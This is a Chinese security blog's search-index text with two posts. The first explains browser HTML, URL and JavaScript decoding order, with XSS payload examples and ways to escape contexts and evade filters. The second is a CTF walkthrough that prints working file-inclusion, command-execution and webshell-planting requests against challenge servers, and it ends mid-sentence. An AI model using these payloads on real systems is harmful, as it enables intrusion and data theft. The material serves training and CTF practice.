如果大部分问题都回答正确，且在这过程中没有感到困惑，那么就不需要再阅读这篇文章了。 本文将讲解浏览器工作的一些原理和解析过程，希望能有些帮助。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:2","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"二、浏览器工作原理 浏览器的主要组件，包含用户界面、浏览器引擎、呈现引擎、网络、用户界面后端、JavaScript解释器、数据存储。 用户界面： 包括地址栏、前进/后退按钮、书签菜单等。除了浏览器主窗口显示的您请求的页面外，其他显示的各个部分都属于用户界面。 浏览器引擎：在用户界面和呈现引擎之间传送指令。 呈现引擎：负责显示请求的内容。如果请求的内容是 HTML，它就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。 网络：用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。 用户界面后端：用于绘制基本的窗口小部件，比如组合框和窗口。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。 JavaScript 解释器：用于解析和执行 JavaScript 代码。 数据存储：这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:2:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"三、网页加载过程 浏览器加载解析渲染呈现的整个过程称为关键渲染路径（Critical Rendering Path），指的是浏览器从请求 HTML，CSS，JavaScript 文件开始，到将它们最终以像素输出到屏幕上这一过程。包括以下几个部分： 构建DOM树，构建CSSOM，构建Render，Layout和Paint，这些过程中存在这一定的交叉。 下面简述浏览器加载解析渲染的整个过程： 1、浏览器通过URL进行域名解析，向服务器发起请求，接受文件 2、构建DOM树：浏览器获取一个HTML页面时，会自上而下加载，并逐行解析HTML标签，解析器根据HTML文档开始构建DOM树。 **HTML文档解析过程**： 1）浏览器接收到显示字节内容的html文件； 2）浏览器将字节内容转换为字符文件； 3）浏览器将字符文件解析成许多Tokens（符号标签）； 4）将Token解析为节点对象Objects； 5）将节点对象Objects连接起来形成DOM树； 3、构建CSSOM树：浏览器在HTML文档解析过程中，遇到外部CSS文件，浏览器会另外发起请求去获取CSS文件并进行解析构建CSSOM树，并不会阻塞网页加载过程，不影响解析HTML文件。 **解析CSS过程**： 步骤与HTML文档解析类似： 1）浏览器接收到字节内容的CSS文件； 2）浏览器将字节内容转换为字符文件； 3）浏览器将字符文件解析成许多Tokens（符号标签）； 4）将Token解析为节点对象Objects； 5）将节点对象Objects连接起来构建成CSSOM树（CSS Rule Tree）； 4、加载过程中，遇到图片资源，也是另发起一个请求获取图片资源，也不会影响HTML文档的加载。 5、JavaScript：在加载过程中，当遇到外链的JS脚本文件或\u003cscript\u003e等标签内的JS代码时，会暂停HTML标签的解析，挂起HTML文档加载解析渲染的线程，加载JS脚本文件，使用JavaScript引擎对JS进行解析，通过DOM API 和CSSOM API来操作 DOM Tree和 CSS Rule Tree。等到JS文件加载、解析完毕，才会继续解析HTML，恢复HTML文档的渲染线程。 **解析JS代码过程**： 1）浏览器会请求js代码，这时HTML文件的解析会停下来； 2）但是CSS文件的解析不会停止，所以会继续构造出CSSOM树； 3）在构建CSSOM树时，返回的js文件并不会执行，在CSSOM树构建完成，才会运行JS文件。 4）JS文件执行结束后，HTML继续解析并构建出DOM树，进行下一步。 6、构建渲染树：在DOM树和CSSOM树构建完成后，浏览器会结合DOM Tree和CSS Rule Tree 构建呈现树/渲染树（Rendering Tree）； 7、布局阶段：获取渲染树结构、节点位置和大小等； 8、绘制元素：根据渲染树和布局绘制所有节点的可视属性。 9、合并渲染层：把以上绘制的所有图层（类似于PhotoShop中的“图层”）合并,最终输出一张图片 当用户在浏览网页时进行交互或通过 js 脚本改变页面结构时，以上的部分操作有可能重复运行，此过程称为 Repaint 或 Reflow。 Repaint：当元素改变时，不会影响元素在页面当中的位置（比如 background-color, border-color, visibility），浏览器仅仅会应用新的样式重绘此元素，此过程称为 Repaint。 Reflow：当元素改变时，将会影响文档内容、结构或元素位置，此过程称为 Reflow。（ HTML 使用的是 flow based layout ，即流式布局，所以，如果某元件的几何尺寸发生了变化，需要重新布局，也就叫 Reflow。） ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:3:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"四、浏览器解析 解析 HTML 文档涉及三个主要过程：HTML 解析器、URL 解析器和 JavaScript 解析器。每个解析器负责解码和解析其文档，并且在相应的解析器规范中明确指定了它们应该如何执行此操作。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.1 HTML解析 上文说过浏览器将收到的HTML文件的字节内容转换为字符文件，然后将字符文件解析成许多Tokens（符号标签），在这一过程用到的就是HTML解析器。 参考HTML标记规范，我们只需关注如何完成文档解码和何时创建新token。 首先了解一下HTML解析器的工作原理： HTML解析器是一个状态机，它自上而下对HTML资源从进行解析，当遇到一个\u003c符号（后面没有/）时，就会进入标签开始状态（Tag Open State）； 然后进入标签名称状态（Tag name state）搜寻标签，img可以被识别为正确的标签，img1则不会识别。 后面可能还有其他很多种状态，如：\"Before attribute name state\"、“Attribute name state”等，我们先不提，有兴趣可以去看HTML标记规范。 当最后在读到最近的一个\u003e时，结束标签状态进入数据状态（Data State），发出当前标签token。 当解析器处于“数据状态”时，它会继续进行HTML解析处理并在发现完整标记时发出token。 HTML字符实体解码 在解析过程中遇到HTML字符实体编码，HTML解析器处于以下三种状态时，能够对HTML字符实体进行解码： “数据状态”（“Character reference in data state”； “RCDATA状态”（“Character reference in RCDATA state”） “属性值状态”（“Character reference in attribute value state”）。 这些状态下，HTML 实体将从其“\u0026#..;”形式中解码出来，变成相应的字符插入到数据缓冲区。 也就是说，HTML字符实体编码只能在数据状态（标签外部和标签的text段），RCDATA状态（RCDATA元素内）、属性值状态（标签内的属性值位置）才能被解析。 1.数据状态 13.2.5.1 Data state Consume the next input character: U+0026 AMPERSAND (\u0026) Set the return state to the data state. Switch to the character reference state. U+003C LESS-THAN SIGN (\u003c) Switch to the tag open state. U+0000 NULL This is an unexpected-null-character parse error. Emit the current input character as a character token. EOF Emit an end-of-file token. Anything else Emit the current input character as a character token. 当在数据状态，即标签外部，或者标签内的text段中，匹配到\u0026符号时，会切换到字符引用状态（character reference state）。 例如问题4，“\u003c”和“\u003e”字符在输入流中被编码为“\u0026#60;”和“\u0026#62;”，当解析器处于“数据状态”时，它们将被解析。 4.实体编码\u003c \u003e \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e 那么当HTML实体被解析为\u003c \u003e时，它们中的脚本能否被执行呢？ 答案是不能，因为当解析器在解析实体编码后，不会转换成“标签打开状态”，因此不会创建新的标签。 这就是我们为什么建议用字符实体编码来处理不受信任的用户输入，以确保它们作为数据进行解析。 再看，我们对h1的h进行HTML实体编码，它能被解析形成标签吗？ \u003cdiv\u003e \u003c\u0026#104;1\u003e123\u003c/h1\u003e \u003c/div\u003e 答案是不能，HTML解析器首先匹配到div标签，进入数据状态，接着搜索到\u003c，进入标签名称状态，但并没有匹配到正确的标签，所以回到了数据状态，对\u0026#104;进行解码，最后返回的结果就是文本状态下的\u003ch1\u003e123。 2.RCDATA状态 什么是RCDATA？我们需要知道HTML中共有5种元素：空元素、原始文本元素、RCDATA元素、外来元素以及常规元素。RCDATA状态就是RCDATA元素标签内的状态。 Void 元素：area, base, br, col, embed, hr, img, input, keygen, link, menuitem, meta, param, source, track, wbr。Void元素没有结束标签，因此不能在开始标签和结束标签直接放任何内容。 Raw text 元素：script, style。Raw text元素能含有text文本内容。 RCDATA 元素：textarea, title。RCDATA 元素可以有文本和字符引用 Foreign 元素：MathML 命名空间和 SVG 命名空间的元素。外部元素可以有文本、字符引用、CDATA 部分、其他元素和注释。 Normal 元素：除了以上4种元素以外的其他所有允许的 HTML 元素都是普通元素。普通元素可以有文本、字符引用、其他元素和注释。 13.2.5.2 RCDATA state Consume the next input character: U+0026 AMPERSAND (\u0026) Set the return state to the RCDATA state. Switch to the character reference state. U+003C LESS-THAN SIGN (\u003c) Switch to the RCDATA less-than sign state. U+0000 NULL This is an unexpected-null-character parse error. Emit a U+FFFD REPLACEMENT CHARACTER character token. EOF Emit an end-of-file token. Anything else Emit the current input character as a character token. 之前我们说“RCDATA 状态”下可以对HTML字符引用进行解码。这意味着“textarea”和“title”中的字符引用将被 HTML 解析器解码。 同样，在解码这些字符引用时没有进入“标签打开状态”，这就是问题 5 中没有脚本执行的原因。 5.实体编码\u003c \u003e \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e 此外，RCDATA还有一个特别之处。当浏览器解析到 RCDATA 元素时，它会进入“RCDATA 状态”。在这种状态下，如果遇到’\u003c‘字符，就会切换到“RCDATA小于号状态”（RCDATA less-than sign state），如果后面紧跟的不是相应的RCDATA元素闭合标签，则会回到“RCDATA状态”。 这意味着在 RCDATA 元素（例如 \u003ctextarea\u003e、\u003ctitle\u003e）的标签内部，唯一能够被识别为标签的字符是 ”\u003c/textarea\u003e”闭合标签或“\u003c/title\u003e”闭合标签，具体取决于前面打开的标签。 因此，即便在“textarea”或“title”中创建额外的标签，也无法在其中执行脚本。这就解释了为什么问题6中脚本不执行。 \u003ctextarea\u003e\u003cscript\u003ealert(6)\u003c/script\u003e\u003c/textarea\u003e 关于“CDATA”元素的简单说明。CDATA 中包含的任何内容都不会导致解析器创建新的开放标记，并且它以“]]\u003e”序列结束。 因此，如果用户输入想要跳出 CDATA 上下文，必须使用没有任何编码的精确“]]\u003e”序列，否则它不会跳出上下文。 所以当我们遇到\u003ctextarea\u003e或\u003ctitle\u003e标签下的XSS插入点时，首先要做的就是闭合前面的标签，这样后续的payload才可能被执行，如： \u003c/title\u003e\u003cscript\u003ealert(1)\u003c/script\u003e \u003c/textarea\u003e\u003cscript\u003ealert(2)\u003c/script\u003e Foreign 元素 细心的同学会发现上文我们提到Foreign元素也可以有字符引用。 Foreign 元素：MathML 命名空间和 SVG 命名空间的元素。外部元素可以有文本、字符引用、CDATA 部分、其他元素和注释。 这类情况，也是属于数据状态解析HTML字符引用，看示例： 编码\u003cimg src onerror=alert(1)\u003e \u003cmath\u003e\u0026lt;\u0026#105;\u0026#109;\u0026#103;\u0026#32;\u0026#115;\u0026#114;\u0026#99;\u0026#32;\u0026#111;\u0026#110;\u0026#101;\u0026#114;\u0026#114;\u0026#111;\u0026#114;\u0026equals;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026lpar;\u0026#49;\u0026rpar;\u0026gt;\u003c/math\u003e \u003csvg\u003e\u0026lt;\u0026#105;\u0026#109;\u0026#103;\u0026#32;\u0026#115;\u0026#114;\u0026#99;\u0026#32;\u0026#111;\u0026#110;\u0026#101;\u0026#114;\u0026#114;\u0026#111;\u0026#114;\u0026equals;\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116;\u0026lpar;\u0026#49;\u0026rpar;\u0026gt;\u003c/svg\u003e 上述示例可以被解码，但与之前提过的一样，","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:1","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.2 URL解析 URL 解析器也可以视为状态机，输入流中的字符可以将其定向到不同的状态。URL解析器规范在这里。 从安全或 XSS 转义的角度来看，有几件事很有趣。 首先，URL 格式必须是 ASCII 字母字符。 (U+0041-U+005A || U+0061-U+007A)，否则状态会转变为“无格式”状态。 例如，如果对协议格式进行任何形式的编码，URL 解析器都将无法识别为协议。问题 1 中的脚本不执行就是因为URL 解析器没有将url 编码的“javascript”识别为协议。 1.URL编码\"javascript:alert(1)\" \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e 3.URL编码\":\" \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e 同样的理论也适用于 ‘:’ 字符，如果对其进行编码将无法识别。这就是问题 3 中的脚本不会执行的原因。 那么，当使用字符实体对方案 (javascript) 进行编码时，为什么问题 2 中的脚本会执行？ \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;:%61 %6c%65%72%74%28%32%29\"\u003e 这里就要用到刚在HTML 解析部分讨论过的内容，有一种状态称为“属性值状态”，在这种状态下，字符引用将被解码并替换为解码后的版本。 \u003ca href=\"javascript:%61 %6c%65%72%74%28%32%29\"\u003e 这里实际发生的是HTML解析器解析文档、创建标签tokens并解码 href 属性中的HTML字符实体。 当 HTML 解析器完成后，URL 解析器开始解析 href 值中的链接，此时“javascript”已经解码，并被 URL 解析器识别为JavaScript协议。 然后 URL 解析器继续对链接的后续部分进行 URL 解码。因为是“javascript”协议，所以后续使用JavaScript 解析器来解析执行，这就是问题 2 中的脚本被执行的原因。 ⚠️注意：URL编码是使用UTF-8编码方案对每个字符进行编码。如果使用另一种方案对URL进行编码，则 URL 解析器可能无法识别，这可能会变得失效。 url解析器识别相应的协议，我们上面提到JavaScript伪协议之外，通过http协议加载外部JS文件，也是一种方式。 在对外部链接的处理上，还可以设计一些URI的变形，不过这些不在本文进行赘述。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:2","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"4.3 JavaScript解析 JavaScript 解析不同于 HTML 解析，因为JS语言本身是上下文无关的语言(context free language)，，可以通过上下文无关语法(context free grammar)来弄清楚 JavaScript 是如何被解析的。 ECMAScript-262 的规范在这里，一个单独的HTML解析语法文件在这里。 JS的脚本处理模型是按照源码处理-函数解析-代码执行这个顺序进行，不管是外部JS还是\u003cscript\u003e 标签内，或者 HTML标签属性中的，对JS编码的解码都是相同的。 1. 执行上下文 当一段 JavaScript 代码在运行的时候，它实际上是运行在执行上下文中。而下列三种代码都会创建相应的执行上下文： 全局执行上下文：它是为运行代码主体而创建的执行上下文，也就是说它是为那些存在于函数之外的任何代码而创建的。 函数执行上下文：每个函数会在执行的时候创建自己的执行上下文。 Eval 函数执行上下文：使用 eval() 函数也会创建一个新的执行上下文。 这部分内容不是重点，就不多说了。 2.字符解码 我们主要关注关于安全性、字符解码方式以及在某些上下文中转义是否有效这些问题。 首先，让我们稍微回到 HTML 解析中的\"Raw text\"元素，因为它与 JavaScript 解析有关。 所有“script”块都属于原始文本元素，“script”块有一个有趣的属性：字符引用实体在其中不被解析和解码。这意味着问题 9 中的脚本将不会执行。 9.实体编码alert(9); \u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e 那么像 \\uXXXX（例如 \\u0000、\\u000A）这样的Unicode 转义序列字符编码的 JavaScript 会被解析和执行吗？答案是需要看情况，这取决于编码序列所处的位置。 根据上下文，有三种情况可以使用转义序列：字符串、标识符名称或控制字符。 字符串：当字符串中存在 Unicode 转义序列时，它们只会被解释为常规字符，而不是单双引号（’ “）或可以结束字符串的行终止符。这在 ECMAScript 规范中有明确说明。因此，Unicode 转义序列永远不会脱离 JavaScript 中的字符串上下文，因为它们总是被解释为字符串文字。 ECMA-262 edition13.0, Rev 11, Clause 1 “ECMAScript differs from the Java programming language in the behaviour of Unicode escape sequences. In a Java program, if the Unicode escape sequence \\u000A, for example, occurs within a single-line comment, it is interpreted as a line terminator (Unicode character 000A is line feed) and therefore the next Unicode character is not part of the comment. Similarly, if the Unicode escape sequence \\u000A occurs within a string literal in a Java program, it is likewise interpreted as a line terminator, which is not allowed within a string literal—one must write \\n instead of\\u000A to cause a line feed to be part of the string value of a string literal. In an ECMAScript program, a Unicode escape sequence occurring within a comment is never interpreted and therefore cannot contribute to termination of the comment. Similarly, a Unicode escape sequence occurring within a string literal in an ECMAScript program always contributes a Unicode character to the literal and is never interpreted as a line terminator or as a quote mark that might terminate the string literal.” 翻译： ECMA-262 版本13.0，第11章，第1条款 ECMAScript 与 Java 编程语言的区别在于 Unicode 转义序列的行为。 在Java中，如果Unicode转义序列\\u000A，出现在单行注释中，它被解释为行终止符（Unicode 字符 000A 是换行符），因此下一个 Unicode 字符将不是注释的一部分。同样，如果\\u000A 出现在 Java 程序的字符串文字中，它同样被解释为行终止符，这在字符串文字中是不允许的——必须写 \\n 而不是 \\u000A 以使换行符成为字符串文字的一部分。 在 ECMAScript 程序中，注释中出现的 Unicode 转义序列永远不会被解释，因此不会导致注释的终止。类似地，在 ECMAScript 程序的字符串文字中出现的 Unicode 转义序列总是为文字提供一个 Unicode 字符，并且永远不会被解释为行终止符或可能字符串终止的引号。 标识符名称：当标识符名称中存在 Unicode 转义序列时，它们将被解码并解释为标识符的名称，例如函数名称、属性名称等。 这就是为什么问题 10 中的脚本是可执行的。 \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e 如果我们深入研究规范，它也清楚地说明如下。 ECMA-262 edition13.0, Rev 12, Clause 6.1 “Unicode escape sequences are permitted in an IdentifierName, where they contribute a single Unicode code point to the IdentifierName. The code point is expressed by the CodePoint of the UnicodeEscapeSequence (see 12.8.4). The \\ preceding the UnicodeEscapeSequence and the u and { } code units, if they appear, do not contribute code points to the IdentifierName. A UnicodeEscapeSequence cannot be used to put a code point into an IdentifierName that would otherwise be illegal. “ 翻译： 标识符名称中也允许使用 Unicode 转义序列，它们将作为标识符中的一个字符，由Unicode 转义序列的 CV 计算转换（见 7.8.4）。Unicode 转义序列前的 \\ 不会转换为标识符名称中的一个字符。 Unicode 转义序列不能用于将字符放入标识符名称中，否则将是非法的。 标识符名称中允许使用 Unicode 转义序列，它们将作为标识符中的Unicode代码点。代码点由 Unicode 转义序列的 CodePoint 表示（见 12.8.4）。Unicode 转义序列之前的 \\ 以及 u 和 { } 代码单元（如果有）不会作为标识符名称中的代码点。 Unicode 转义序列不能用于将代码点放入标识符名称，否则将是非法的。 控制字符：当 Unicode 转义序列表示控制字符时，如单引号、双引号、括号等，它们不会被解释为控制字符，只会被解码和解析为标识符名称或字符串文字。查看 ECMAScript 语法，就会发现没有任何可以充当控制字符的 Unicode 转义序列。例如，如果解析器正在解析函数调用语句，则括号必须是“(”和“)”，而不是像 \\u0028 和 \\u0029 这样的字符。 也就是说，Unicode 转义序列只有在标识符名称的上下文中才会被解释为字符串，这是唯一可以注入并利用的地方。 回顾问题 11不起作用，因为 ‘(11)’ 没有被正确解释而且 ‘alert(11)’ 不是有效的标识符名称。 11.unicode编码alert(11) \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e 问题 12 ， ‘\\u0031\\u0032’ 不会被解释为字符串，因为它们必须以单引号或双引号开头，或者是 ASCII 数字。 12.","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:4:3","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"五、浏览器解码顺序 在讨论了浏览器 HTML、URL 和 JavaScript 解析之后，所有这些如何一起发挥作用？接下来将非常简要地回顾浏览器如何解析文档。 当浏览器从网络堆栈获取内容时，HTML 解析器被触发并开始标记文档。这是完成HTML字符引用解码的步骤。标记化完成后，构建 DOM 树。 JavaScript 解析器开始解析内联脚本和script块中的脚本。这是对 Unicode 转义序列和 Hex 转义序列进行解码的步骤。 同时，如果浏览器遇到需要 URL 的上下文，URL 解析器也会启动以解码 URL 内容。这是完成 URL 解码的步骤。根据 URL 的位置，URL 解析器可能会在 JavaScript 解析器进入之前或之后解析内容。 考虑以下两个示例。 Example A: \u003ca href=\"UserInput\"\u003e\u003c/a\u003e Example B: \u003ca href=# onclick=\"window.open('UserInput')\"\u003e\u003c/a\u003e 在示例 A 中，HTML 解析器将首先启动并对用户输入执行字符引用解码。然后 URL 解析器开始对 href 中的值进行 URL 解码。最后，如果 URL scheme 是 javascript，则 JavaScript 解析器来执行 Unicode 转义序列和 Hex 转义序列解码。之后，脚本被执行。所以一共有三轮解码，依次是HTML、URL、JavaScript。 在示例 B 中，HTML 解析器也首先启动。但是之后，JavaScript 解析器开始解析 onclick 处理程序中的值，因为 onclick 处理程序中需要脚本。当 JavaScript 被解析和执行时，它看到它正在执行“window.open()”，其中参数应该是一个 URL。此时，URL 解析器开始对用户输入进行 URL 解码，并将结果传回 JavaScript 引擎。所以一共有三轮解码，依次是HTML、JavaScript、URL。 有没有可能超过三轮解码？考虑下面的例子 Example C: \u003ca href=\"javascript:window.open('UserInput')\"\u003e 示例 C 与 A 类似，但在 JavaScript 中存在“window.open”调用的意义上也有所不同。因此，将对 UserInput 进行额外的 URL 解码。一般情况下会进行四次解码，依次为HTML、URL、JavaScript、URL。 此时，您应该具备解决文章开头所有问题的必要知识。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:5:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"六、总结 总而言之，为了了解如何使 XSS payload脱离攻击者的上下文，或者如何使应用程序服务器正确编码用户输入，就必须真正了解浏览器解析器的工作原理以及组件（HTML、URL 和 JavaScript 解析器）如何协同工作。 同样，如果想要绕过防御检测，使payload能够被正确解析执行，也必须要了解浏览器的工作原理和解析器的协调处理，只有在这种情况下，才能像浏览器一样正确地编码攻击载荷。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:6:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"参考文章： Deep dive into browser parsing and XSS payload encoding HTML标记规范 URL规范 HTML 语法 浏览器解析HTML，渲染页面的过程 深入理解浏览器解析渲染 HTML 浏览器工作原理与XSS-HTML编码 理解 JavaScript 的执行上下文这篇就够了！ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:7:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["靶场"],"content":"最近想考PTS，想先了解一下相关内容，朋友就给我发了一个谷安的问卷调查，上面有些CTF题，做着玩玩。 题目来源： 谷安学院CISP-PTS渗透测试专家认证-预报名测试 https://ks.wjx.top/jq/94623813.aspx 问卷为谷安学院渗透测试专家CISP-PTS认证预报名测试题。 3道实操题目答对2道即可报名PTS。 ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:0:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"1、POST\u0026GET 题目链接：http://118.195.198.108:9997/ 💡 hint： 请以get方式提交a=1 post方式提交b=2给服务器 Poc: POST /?a=1 HTTP/1.1 Host: 118.195.198.108:9997 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 3 b=2 返回key，key1:T0kS7r3c ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:1:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"2、include 题目链接：http://118.195.198.108:9998/ 💡Hint: \u003c?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; //while (strstr($page, \"php://\")) { // $page=str_replace(\"php://\", \"\", $page); //} include($page); ?\u003e 利用点就是include($page);，注释中提示了php://伪协议 Poc: ?hello=\u0026page=php://filter/read=convert.base64-encode/resource=flag.php ?hello=\u0026page=data://text/plain,\u003c?php system('ls');?\u003e 考点：文件包含漏洞，伪协议 POST /?hello=\u0026page=php://input HTTP/1.1 Host: 118.195.198.108:9998 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 31 \u003c?php system('cat flag.php');?\u003e ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:2:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"3、Hacked by Alphabug 题目链接：http://118.195.198.108:9999/ 💡 Hint: 0 \u003c?php #Hacked by Alphabug header(\"Content-type:text/html;charset=utf-8\"); /* Hint: get the shell find the key；）\\n\"; */ $sandbox = '/var/www/html/sandbox/' . md5(\"M0rk\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0777,true); chdir($sandbox); echo strlen($_GET['cmd']); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 30) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); echo \"\u003cbr /\u003e IP : {$_SERVER['REMOTE_ADDR']}\"; ?\u003e IP : xxxxxx md5(\"M0rk\" . $_SERVER['REMOTE_ADDR'])算出自己的sandbox地址。 通过cmd进行写shell，为了及时发现自己的错误，可以先写txt，再通过cp命令转成php ?cmd=echo+'\u003c?php'\u003e\u003ei.txt ?cmd=echo+'$a=$_POST[\"a\"];'\u003e\u003ei.txt ?cmd=echo+'eval($a);'\u003e\u003ei.txt ?cmd=cp+i.txt+i.php 连接shell，获取flag ","date":"2023-02-28","objectID":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/:3:0","tags":["PTS","CTF","证书"],"title":"PTS 谷安预报名测试","uri":"/posts/pts-%E8%B0%B7%E5%AE%89%E9%A2%84%E6%8A%A5%E5%90%8D%E6%B5%8B%E8%AF%95/"},{"categories":["靶场"],"content":"4、密码是什么呢？ 💡Hint 密码是什么呢？ \u003c?php @eval($_POST['?']);?\u003e 暴破一句话木马的连接密码 PHP一句话可以执行PHP命令，为了方便暴破，我们可以使用PHP 